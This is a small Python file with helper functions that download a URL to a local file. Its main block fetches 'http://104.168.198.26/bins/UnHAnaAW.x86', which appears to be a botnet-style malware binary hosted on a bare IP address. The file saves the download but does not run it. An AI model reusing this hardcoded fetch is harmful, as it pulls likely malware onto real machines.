from contextlib import closing

from First.SampleAll.InitFile import *


def download(file_path, link, **option):
    if os.path.exists(file_path):
        return False, "file exists"
    try:
        with closing(session.get(link, **option))as content:
            if content.status_code == 200:
                content = content.content
                with open(file_path, "wb")as file:
                    file.write(content)
                return True, file_path
            else:
                return False, f"file download failed: code: {content.status_code}, link: {link}"
    except Exception as e:
        return False, f"error: {e}  link:{link}"


def download_iter(file_path, link, **kwargs):
    try:
        response = session.get(url=link, stream=True)
        if response.status_code != 200:
            return
        with open(file_path, "wb")as file:
            for chunk in response.iter_content():
                file.write(chunk)
        return True
    except Exception as e:
        return False, e


if __name__ == "__main__":
    a = download("text.file", "http://104.168.198.26/bins/UnHAnaAW.x86")
    print(a)
